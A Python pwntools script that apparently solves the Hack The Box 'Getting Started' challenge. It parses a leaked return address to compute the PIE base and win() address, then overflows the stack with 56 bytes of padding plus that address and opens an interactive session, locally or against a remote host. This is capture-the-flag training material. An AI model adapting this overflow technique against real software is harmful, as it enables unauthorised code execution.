#!/usr/bin/env python3
from pwn import *
import argparse
import re

context.binary = './gs'
elf = context.binary

def get_process(args):
    if args.host and args.port:
        return remote(args.host, int(args.port))
    return process(elf.path)

def calculate_addresses(leaked_ret):
    offset_to_ret = 0x87  # difference from ret addr to start of main
    main_offset = elf.symbols['main']
    win_offset = elf.symbols['win']
    base = leaked_ret - offset_to_ret - main_offset
    win_addr = base + win_offset # classic PIE base calc
    fast_win_addr = leaked_ret - 0x532 # direct ret2win via offset from leak
    return base, win_addr, fast_win_addr

def perform_exploit(p):
    output = p.recvuntil(b">>", timeout=2).decode()
    match = re.search(r"0x[0-9a-f]+ \| (0x[0-9a-f]+) <- Saved return address", output)
    assert match, "Couldn't find leaked return address in output"
    leaked_ret = int(match.group(1), 16)

    base, win_addr, fast_win_addr = calculate_addresses(leaked_ret)
    log.info(f"PIE base calculated: {hex(base)}")
    log.info(f"Resolved win() address with PIE base: {hex(win_addr)}")
    log.info(f"Resolved win() address without PIE base: {hex(fast_win_addr)}")

    payload = b"A" * 56 + p64(fast_win_addr)
    p.sendline(payload)
    p.interactive()

def main():
    parser = argparse.ArgumentParser(description="Exploit for Getting Started (HTB)")
    parser.add_argument('--host', help='Remote host')
    parser.add_argument('--port', help='Remote port')
    args = parser.parse_args()

    p = get_process(args)
    perform_exploit(p)

if __name__ == '__main__':
    main()